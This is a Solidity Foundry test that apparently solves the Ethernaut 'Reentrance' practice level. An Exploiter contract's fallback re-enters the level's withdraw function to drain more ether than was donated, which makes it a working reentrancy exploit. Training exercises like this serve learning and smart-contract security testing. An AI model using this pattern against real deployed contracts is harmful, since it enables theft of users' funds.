// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Reentrance.sol";
import "src/levels/ReentranceFactory.sol";

contract TestReentrance is BaseTest {
    Reentrance private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new ReentranceFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        uint256 insertCoin = ReentranceFactory(payable(address(levelFactory))).insertCoin();
        levelAddress = payable(this.createLevelInstance{value: insertCoin}(true));
        level = Reentrance(levelAddress);

        // Check that the contract is correctly setup
        assertEq(address(level).balance, insertCoin);
    }

    function exploitLevel() internal override {
        vm.startPrank(player);

        Exploiter re = new Exploiter(level);
        level.donate{value: 0.001 ether}(address(re));
        re.exploit(0.001 ether);
        vm.stopPrank();
    }
}

contract Exploiter {
    bool internal _lock;
    Reentrance internal _target;

    constructor(Reentrance target) public {
        _lock = false;
        _target = target;
    }

    function exploit(uint256 amount) public {
        _target.withdraw(amount);
    }

    fallback() external payable {
        if (!_lock) {
            _lock = true;
            _target.withdraw(msg.value);
            _lock = false;
        }
    }
}
